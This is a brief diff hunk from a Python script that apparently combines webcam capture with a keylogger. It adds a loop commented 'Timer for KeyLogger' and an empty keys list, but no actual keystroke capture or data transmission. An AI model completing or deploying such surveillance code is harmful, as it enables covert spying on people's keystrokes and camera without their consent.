@@ -120,3 +120,8 @@ webCamera()
 number_of_iterations = 0
 currentTime = time.time()
 stoppingTime = time.time() + time_iteration
+
+# Timer for KeyLogger
+while number_of_iterations < number_of_iterations_end:
+    count = 0
+    keys = []
